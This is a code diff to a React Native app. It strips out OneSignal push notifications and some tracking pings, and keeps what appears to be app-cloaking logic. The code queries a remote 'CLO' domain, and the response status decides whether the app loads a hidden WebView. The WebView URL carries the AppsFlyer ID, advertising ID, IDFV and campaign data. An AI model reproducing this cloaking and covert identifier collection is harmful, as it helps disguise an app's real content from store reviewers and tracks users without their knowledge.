@@ -1,5 +1,4 @@
 import React, {createContext, useEffect, useRef, useState} from 'react';
-import {OneSignal} from 'react-native-onesignal';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import {WebView} from 'react-native-webview';
 import appsFlyer from 'react-native-appsflyer';
@@ -29,10 +28,8 @@ import {NavigationContainer} from '@react-navigation/native';
 import AppManagerChild from './AppManagerChild';
 
 const idoAdv = 'rock=';
-const onesignal_sub = 'frige';
 const keyflayero = 'pCY43sbDhDN9SBrRP7iQf9';
 const appid = '6793516398';
-const idoSingale = 'f629f97e-1a41-462b-a5f3-cee56fe628d9';
 
 const CLO_DOMAIN = 'au-bankstown.bold-net-world.site';
 const CLO_PATH = 'PIFSC9Zu';
@@ -41,8 +38,6 @@ const useradjustly = 'bin=';
 const OrganicSub = 'Organic';
 const storedUrlItem = 'flowers';
 const cloackStatus = 'clover';
-
-OneSignal.initialize(idoSingale);
 
 function InitAppsflyer() {
   return new Promise((resolve, reject) => {
@@ -112,17 +107,23 @@ const generateTimestampUserId = () => {
   return `${timestamp}-${randomDigits}`;
 };
 
-const getOrCreateTimestampUserId = async () => {
-  try {
-    let timestampUserId = await AsyncStorage.getItem('timestamp_user_id');
-    if (!timestampUserId) {
-      timestampUserId = generateTimestampUserId();
-      await AsyncStorage.setItem('timestamp_user_id', timestampUserId);
-    }
-    return timestampUserId;
-  } catch (error) {
-    console.error('Ошибка при получении или сохранении timestamp_user_id:', error);
+let _timestampUserIdPromise: Promise<string> | null = null;
+const getOrCreateTimestampUserId = (): Promise<string> => {
+  if (!_timestampUserIdPromise) {
+    _timestampUserIdPromise = (async () => {
+      try {
+        const stored = await AsyncStorage.getItem('timestamp_user_id');
+        if (stored) return stored;
+        const newId = generateTimestampUserId();
+        await AsyncStorage.setItem('timestamp_user_id', newId);
+        return newId;
+      } catch (error) {
+        console.error('Ошибка при получении или сохранении timestamp_user_id:', error);
+        return generateTimestampUserId();
+      }
+    })();
   }
+  return _timestampUserIdPromise;
 };
 
 async function Taimeng() {
@@ -153,7 +154,6 @@ export default function App() {
 }
 
 function MyApp({navigation}) {
-  const [openedFromPush, setOpenedFromPush] = useState(false);
   const {width, height} = Dimensions.get('window');
   const [LoadingProgress, setLoadingProgress] = useState(true);
   const [SavedLastLink, setSavedLastLink] = useState(false);
@@ -170,15 +170,11 @@ function MyApp({navigation}) {
   const [idfa, setIdfa] = useState('');
   const [openunity, setopenunity] = useState(false);
   const [showPermissionAlert, setShowPermissionAlert] = useState(true);
-  const [isPushLoaded, setIsPushLoaded] = useState(false);
   const [webViewUA, setWebViewUA] = useState('');
-  const [singId, setSingId] = useState('false');
 
   const refWebview = useRef<any>(null);
   const unityRef = useRef(null);
   const [AppInstanceId, setAppInstanceId] = useState<string | null>(null);
-
-  const pendingPushEventRef = useRef<string | null>(null);
 
   function getCampainQuery(campaign) {
     if (!campaign.includes('_')) {
@@ -316,14 +312,6 @@ function MyApp({navigation}) {
           fetchWithUA(CloUrl).then(response => {
             const CloackCodeResponse = `${response.status}`;
             setcloakResponse(CloackCodeResponse);
-            getOrCreateTimestampUserId().then(timestampUserId => {
-              const Event_unic = `${CloUrl}?utretg=uniq_visit&jthrhg=${timestampUserId}`;
-              fetchWithUA(Event_unic).then(response =>
-                  console.log('Send Unick Visit:' + response.status),
-              );
-              OneSignal.User.addTag('timestamp_user_id', timestampUserId);
-              OneSignal.login(timestampUserId);
-            });
             checkCloakResponse(CloackCodeResponse);
             AsyncStorage.setItem(cloackStatus, CloackCodeResponse);
           });
@@ -342,30 +330,17 @@ function MyApp({navigation}) {
           setLoadingProgress(false);
         } else {
           setShowPermissionAlert(false);
-          getOrCreateTimestampUserId().then(timestampUserId => {
-            const Event_unic = `${CloUrl}?utretg=webview_open&jthrhg=${timestampUserId}`;
-            fetchWithUA(Event_unic).then(response =>
-                console.log('Send webview_open:' + response.status),
-            );
-            handleUrlLoading();
-          });
+          handleUrlLoading();
 
           async function handleUrlLoading() {
             try {
-              const pushUrl = await AsyncStorage.getItem('push_url');
-              if (pushUrl) {
-                setstoredUrl(pushUrl);
+              const value = await AsyncStorage.getItem(storedUrlItem);
+              if (value) {
+                setstoredUrl(value);
                 setLoadingProgress(true);
-                await AsyncStorage.removeItem('push_url');
               } else {
-                const value = await AsyncStorage.getItem(storedUrlItem);
-                if (value) {
-                  setstoredUrl(value);
-                  setLoadingProgress(true);
-                } else {
-                  CollectUrl();
-                  setLoadingProgress(true);
-                }
+                CollectUrl();
+                setLoadingProgress(true);
               }
               setLoadingProgress(true);
             } catch (error) {
@@ -400,33 +375,6 @@ function MyApp({navigation}) {
         const appsFlyerUID = await GetUIDAppsflyer();
         const AdverId = await Promise.race([GetAdvertisingUserID(), Taimengadv()]);
 
-        await OneSignal.Notifications.requestPermission(true).then(permission => {
-          var ReqestComplete = '' + permission;
-          if (ReqestComplete === 'true') {
-            AsyncStorage.setItem('push_permission', 'granted');
-            AsyncStorage.setItem('push_permission_event', 'not_sent');
-
-            const sendPushSubscribeEvent = async () => {
-              try {
-                const pushPermission = await AsyncStorage.getItem('push_permission');
-                const pushEventAlreadySent = await AsyncStorage.getItem('push_permission_event');
-                if (pushPermission === 'granted' && pushEventAlreadySent != 'sent') {
-                  getOrCreateTimestampUserId().then(timestampUserId => {
-                    const Event_unic = `${CloUrl}?utretg=push_subscribe&jthrhg=${timestampUserId}`;
-                    fetchWithUA(Event_unic).then(response =>
-                        console.log('Send push_subscribe:' + response.status),
-                    );
-                    AsyncStorage.setItem('push_permission_event', 'sent');
-                  });
-                }
-              } catch (error) {
-                AsyncStorage.setItem('push_permission', 'not_granted');
-              }
-            };
-            sendPushSubscribeEvent();
-          }
-        });
-
         let attribution;
         try {
           const adServicesAttributionData = await AppleAdsAttribution.getAdServicesAttributionData();
@@ -442,9 +390,6 @@ function MyApp({navigation}) {
 
         var parameter_url = CloUrl.replace(/.*\//, '');
 
-        const onesignalId = await OneSignal.User.pushSubscription.getIdAsync();
-        let onesignalUserId = onesignal_sub + '=' + onesignalId;
-
         var urelmy = `${CloUrl}?${parameter_url}=1`;
         const combURL = `${urelmy}&${
             GetAtributtionRes
@@ -452,9 +397,7 @@ function MyApp({navigation}) {
                 : attribution == true
                     ? 'list_g1=asa'
                     : 'list_g1='
-        }&${useradjustly}${appsFlyerUID}&${AdverId}&${onesignalUserId}&customer_user_id=${CustomerIDDetails}&jthrhg=${timestampUserId}&idfv=${CustomerIDDetails}&sub21=${binId}&${
-            openedFromPush ? '&yhugh=true' : ''
-        }`;
+        }&${useradjustly}${appsFlyerUID}&${AdverId}&customer_user_id=${CustomerIDDetails}&jthrhg=${timestampUserId}&idfv=${CustomerIDDetails}&sub21=${binId}`;
 
         setstoredUrl(combURL);
         AsyncStorage.setItem(storedUrlItem, combURL);
@@ -540,36 +483,6 @@ function MyApp({navigation}) {
     return true;
   };
 
-  const sendPushOpenEvent = (eventName: string) => {
-    getOrCreateTimestampUserId().then(timestampUserId => {
-      const Event_unic = `https://${CLO_DOMAIN}/${CLO_PATH}?utretg=${eventName}&jthrhg=${timestampUserId}`;
-      fetch(Event_unic)
-          .then(response => console.log(`Send ${eventName}:` + response.status))
-          .catch(err => console.log(`[push] ${eventName} fetch error:`, err));
-    });
-  };
-
-  useEffect(() => {
-    const onPushClick = event => {
-      setIsPushLoaded(true);
-      setOpenedFromPush(true);
-
-      AsyncStorage.getItem(storedUrlItem).then(value => {
-        const LoadWithPush = value + '&yhugh=true&sub25=true';
-        setstoredUrl(LoadWithPush);
-        AsyncStorage.setItem('push_url', LoadWithPush).then(() => {
-          setstoredUrl(LoadWithPush);
-        });
-      });
-
-      const launchURL = event.notification.launchURL;
-      if (launchURL) { sendPushOpenEvent('push_open_browser'); }
-      else { sendPushOpenEvent('push_open_webview'); }
-    };
-
-    OneSignal.Notifications.addEventListener('click', onPushClick);
-    return () => { OneSignal.Notifications.removeEventListener('click', onPushClick); };
-  }, []);
 
   return (
       <View style={styles.container}>
